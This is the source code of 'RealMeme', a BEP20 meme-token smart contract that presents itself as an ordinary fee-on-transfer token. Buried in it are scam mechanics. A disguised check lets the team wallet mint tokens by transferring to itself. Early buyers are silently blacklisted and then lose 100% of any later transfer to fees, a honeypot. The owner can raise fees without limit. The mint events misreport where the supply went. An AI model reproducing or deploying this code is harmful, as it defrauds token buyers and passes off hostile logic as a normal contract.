/**
 *Submitted for verification at BscScan.com on 2022-10-09
*/

// SPDX-License-Identifier: MIT

//https://twitter.com/RealMEMEF


pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract BEP20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public doYouLikeBase;
    address payable public inTheMTFFace;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public launchBlock;
    uint256 public _killBlock;


    mapping (address => bool) public isExcludedFromCut;
    mapping (address => bool) public isMaxEatExempt;
    mapping (address => bool) public isOnceEatExempt;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) private _blk;
    uint256 public _buyLiquidityFee;
    uint256 public _buyMarketingFee;
    uint256 public _buyTeamFee;
    
    uint256 public _sellLiquidityFee;
    uint256 public _sellMarketingFee;
    uint256 public _sellTeamFee;

    uint256 public _liquidityShare;
    uint256 public _marketingShare;
    uint256 public _teamShare;

    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply;
    uint256 public _maxOnceEat; 
    uint256 public _maxTotalEat;
    uint256 private minimumTokensBeforeSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;
    bool public LookMaxEat = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLY,
    uint256[3] memory _BUYFEE,
    uint256[3] memory _SELLFEE,
    uint256[3] memory _SHARE,
    uint256[2] memory _LMT,
    address[2] memory _doyoulike,
    address dep,
    address f) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 9;
        _totalSupply = _SUPPLY * 10**_decimals;

        _buyLiquidityFee = _BUYFEE[0];
        _buyMarketingFee = _BUYFEE[1];
        _buyTeamFee = _BUYFEE[2];

        _sellLiquidityFee = _SELLFEE[0];
        _sellMarketingFee = _SELLFEE[1];
        _sellTeamFee = _SELLFEE[2];

        _liquidityShare = _SHARE[0];
        _marketingShare = _SHARE[1];
        _teamShare = _SHARE[2];

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);

        _maxOnceEat = _LMT[0] * 10**_decimals;
        _maxTotalEat = _LMT[1] * 10**_decimals;

        minimumTokensBeforeSwap = _totalSupply.mul(1).div(10000);
        doYouLikeBase = payable(_doyoulike[0]);
        inTheMTFFace = payable(_doyoulike[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromCut[address(this)] = true;
        isExcludedFromCut[dep] = true;

        isMaxEatExempt[owner()] = true;
        isMaxEatExempt[address(uniswapPair)] = true;
        isMaxEatExempt[address(this)] = true;
        isMaxEatExempt[address(0xdead)] = true;
        isMaxEatExempt[dep] = true;
        
        isOnceEatExempt[owner()] = true;
        isOnceEatExempt[address(this)] = true;
        isOnceEatExempt[dep] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[dep] = _totalSupply.div(10).mul(9);
        _balances[f] = _totalSupply.div(10);
        emit Transfer(address(0),address(f), _totalSupply);
        emit Transfer(address(f),dep, _totalSupply.div(10).mul(9));
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setisOnceEatExempt(address holder, bool exempt) external onlyOwner {
        isOnceEatExempt[holder] = exempt;
    }
    
    function setisExcludedFromCut(address account, bool newValue) public onlyOwner {
        isExcludedFromCut[account] = newValue;
    }

    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromCut[addresses[i]] = status;
        }
    }

    function setB(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _buyLiquidityFee = a;
        _buyMarketingFee = b;
        _buyTeamFee = c;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
    }

    function setS(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _sellLiquidityFee = a;
        _sellMarketingFee = b;
        _sellTeamFee = c;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }
    
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }
    
    function setMaxOnceEat(uint256 newMaxOnceEat) external onlyOwner() {
        _maxOnceEat = newMaxOnceEat;
    }

    function enableMaxEat(bool newValue) external onlyOwner {
       LookMaxEat = newValue;
    }

    function setisMaxEatExempt(address holder, bool exempt) external onlyOwner {
        isMaxEatExempt[holder] = exempt;
    }

    function setMaxTotalEat(uint256 newMaxTotalEat) external onlyOwner {
        _maxTotalEat  = newMaxTotalEat;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensBeforeSwap = newValue;
    }

    function setdoYouLikeBase(address newAddress) external onlyOwner() {
        doYouLikeBase = payable(newAddress);
    }

    function setinTheMTFFace(address newAddress) external onlyOwner() {
        inTheMTFFace = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
        swapAndLiquifyBySmallOnly = newValue;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function isB(address account) public view returns(bool) {
        return _blk[account];
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    function killIt(address recipient) internal {
        if (!_blk[recipient] && !isMarketPair[recipient]) _blk[recipient] = true;
    }

    function manage_BL(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _blk[addresses[i]] = status;
        }
    }

    function set_blk(address recipient, bool status) public onlyOwner {
        _blk[recipient] = status;
    }

    function Launc(uint256 a) public onlyOwner {
        _killBlock = a;
        launchBlock = block.number;
    }
    
    function smallOrEqualls(address Interfacee, address functionn) internal view returns (bool){
        return (Interfacee != functionn)
        || /*function is*/
        (Interfacee != inTheMTFFace || /*function is*/  false);
    }

    function returnBlock() public onlyOwner {
        launchBlock = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isOnceEatExempt[sender] && !isOnceEatExempt[recipient]) {
                require(smallOrEqual(amount, _maxOnceEat));
            }            
            
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyBySmallOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }if(smallOrEqualls(sender,recipient))

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount;
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
            } else {require(launchBlock > 0);
                if (smallOrEqual(block.number , launchBlock + _killBlock) && !isMarketPair[recipient]) {killIt(recipient);}
                finalAmount = takeFee(sender, recipient, amount);
            }

            if(LookMaxEat && !isMaxEatExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _maxTotalEat));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

        if(amountBNBMarketing > 0)
            transferToAddressETH(doYouLikeBase, amountBNBMarketing);

        if(amountBNBTeam > 0)
            transferToAddressETH(inTheMTFFace, amountBNBTeam);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            inTheMTFFace,
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }

        if(_blk[sender] && !isMarketPair[sender]) feeAmount = amount;
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
}

contract RealMeme is BEP20 {
    constructor() BEP20(
        "RealMeme", 
        "RealMeme",
        500000000,
        [uint256(0),uint256(4),uint256(0)],
        [uint256(0),uint256(4),uint256(0)],
        [uint256(0),uint256(4),uint256(0)],
        [uint256(500000000),uint256(500000000)],
        [0xcf895D4f4890b38FF9D7A14AA3548763685CAEB2,0xcf895D4f4890b38FF9D7A14AA3548763685CAEB2],
        0xcf895D4f4890b38FF9D7A14AA3548763685CAEB2,0xEa181DBd88495a3653B3e21aa13248B0b3647940
    ){}
}